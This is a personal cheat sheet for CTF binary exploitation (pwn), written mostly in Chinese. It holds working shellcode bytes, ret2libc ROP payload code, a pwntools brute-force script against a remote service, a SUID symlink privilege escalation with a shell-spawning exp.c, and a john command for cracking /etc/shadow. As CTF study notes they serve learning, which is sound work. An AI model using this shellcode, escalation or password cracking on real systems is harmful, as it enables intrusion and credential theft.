The flag is not here ~
- https://ctf-wiki.org/
- https://www.toolhelper.cn/Format/Cpp


## 32位的sigreturn调用号为119(0x77)，64位系统调用号为15(0xf)
对于 sigreturn 系统调用来说，在 64 位系统中，sigreturn 系统调用对应的系统调用号为 15，只需要 RAX=15，并且执行syscall 即可实现调用 syscall 调用。而 RAX 寄存器的值又可以通过控制某个函数的返回值来间接控制，比如说 read函数的返回值为读取的字节数。
syscall ; ret : 0f 05 c3
![AgAABg_MH6J6RKLKGXhEMI3Pz7HUGG1z](https://github.com/user-attachments/assets/01cf6800-2f7a-4189-a389-f38d2b351705)

## /bin/sh = /sh = sh，效果一致
## ret到main会在原来的地方开栈
## nb
![AgAABg_MH6I8yCgZXfhOtbMsooC7P9iR](https://github.com/user-attachments/assets/1303e539-9510-45f3-8bf6-0e536b60ddbf)

## fmt读flag
在有pie的情况下可以找(泄露)elf中的某个函数的真实地址来获取pie基址从而获得flag真实地址（类似libc），然后再通过fmt的%s读取（b'flag%7$s'+p64(pie+flag_off)）
## strcmp可以使用\x00进行绕过？
from pwn import *
context(os = 'linux' ,arch = 'amd64' )
i = 0
while True :
        p = remote( '47.97.58.52' , 42000 )
        print ( '<<Times : ' , hex (i))
        p.sendafter( 'her thinking?' , b'\x00' * 0x30 )
        #0x30是read的上限
        try :
                p.recvuntil( "WOW,you can get her!" )
                p.interactive()
        except :
            i = i + 1
            p.close
            continue

## 如果是正常调用 system 函数(plt)，调用时会有一个对应retaddr
![AgAABg_MH6KnF36SJT5NkJubPU_Alyy1](https://github.com/user-attachments/assets/4fdf6244-0bf8-46a6-b8f2-a841b423466f)

## 泄露出可用的gadget偏移，同样使用libc_base+offset
one_gadget libc.so.6

## 沙箱
seccomp-tools dump ./pwn
![AgAABg_MH6LziJAY2hpGiLEQIl1rLBSA](https://github.com/user-attachments/assets/1973c8f5-e173-4983-8819-92edea087060)

![AgAABg_MH6JY_cvEM2NJHLVD95KFPp6m](https://github.com/user-attachments/assets/4378c491-314a-4a6e-98f6-291b121ae7f9)


x/wx w/gx

 
## 软链接
ln -s [exp] [/tmp/echo]之后执行具有suid权限(rwsr--r--中的s)的程序以获取对应用户权限，参考https://www.bilibili.com/video/BV1uM4y1Q7MY/?spm_id_from=pageDriver&vd_source=c525ce304f4270daa217d87f25619231
//exp.c
int main()
{
    system("/bin/bash");
}//gcc -o exp exp.c

 

## 在环境变量前后添加目录
export PATH=/tmp:$PATH
export PATH=$PATH:/tmp

 

## 常用的shellcode有：
32位:
sc=b'\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80'

这个shellcode只有23字节，短小精悍，适合放在栈中去执行
还有一种是通过pwntools生成(44字节)：
from pwn import *
shellcode=asm(shellcraft.sh())#32bit

 
64位：48字节
context(os='linux', arch='amd64')
sc=asm(shellcraft.amd64.sh())

 
## john命令破解密码hash
john /etc/shadow

 
## arm 下的函数调用约定
函数的第 1 ～ 4 个参数分别保存在 r0 ～ r3 寄存器中， 剩下的参数从右向左依次入栈， 被调用者实现栈平衡，函数的返回值保存在 r0 中
![AgAABg_MH6II1QpYv6RHhoXowG6yIUqe](https://github.com/user-attachments/assets/5f95ce4b-2465-44e6-8a47-bd7c6baf182a)

arm 的 b/bl 等指令实现跳转; pc 寄存器相当于 x86 的 eip，保存下一条指令的地址，也是我们要控制的目标

#查看文件保护
checksec elf

#搜索关键语句或指令
ropgadget --binary 可执行文件 --string 'str'
ropgadget --binary elf --only 'pop|ret' | grep 'eax'


## pwndbg中使用vmmap查看地址权限
## flat([])函数拼接指令

## libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。
即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。
https://github.com/niklasb/libc-database ---------https://libc.rip/
https://github.com/lieanu/LibcSearcher
from LibcSearcher import *

#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型
obj = LibcSearcher("fgets", 0X7ff39014bd90)

obj.dump("system")        #system 偏移
obj.dump("str_bin_sh")    #/bin/sh 偏移
obj.dump("__libc_start_main_ret")    

from LibcSearcher import LibcSearcher
libc = LibcSearcher('__libc_start_main', main_real_addr)
libcbase = main_real_addr - libc.dump('__libc_start_main')
sa = libcbase + libc.dump('system')
ba = libcbase + libc.dump('str_bin_sh')

pl=b'a'*(0x50+8)
pl+=p64(rdi)
pl+=p64(ba)
pl+=p64(ret)
pl+=p64(sa)
sl(pl)

## 一般默认函数的第一参数（仅64位？）
存入rdi寄存器（与位有关 edi、di、dil），第二个参数存入rsi寄存器（esi、si、sil） ，第三个放入rdx寄存器（edx、dx、dl）(
RDI, RSI, RDX, RCX, R8, R9, more on the stack

)
：所以在拼接system('/bin/sh')时，应当寻找rdi（64位）或edi（32位）寄存器并先将'/bin/sh'读取后+_system的地址，
即p64(rdi_ret_addr)+p64(binsh_addr)+p64(_system_addr)
## !!!!!!但通过系统中断（即int 0x80）的参数都存在e[a-d]x中，其中eax为系统调用号，e[b-d]x依次为三个参数

#cyclic+数字 指令可以生成任意长度的字符串
cyclic 200

#判断溢出点距离我们变量的底部位置有多少个长度，输入点到ret
cyclic -l +溢出的地址


execve("/bin/sh",NULL,NULL)
int 0x80

 ![AgAABg_MH6JITCTyBO9Dqbkb312rABiU](https://github.com/user-attachments/assets/fe1dad15-e4c4-4b4c-a0af-680d6ce53a47)


## 执行 strcmp 的时候，rdx 会被设置为将要被比较的字符串的长度

## 使用 sys_write 调用
即 int 80h 前 eax 为 4，ebx 为文件描述符 fd，stdout 的文件描述符为 1，ecx 为 buffer 的内存地址，edx 为 buffer 的长度
在调用 sys_read 系统调用前，修改 eax 为 3 自不必说，ebx 改为了 0 即 stdin，

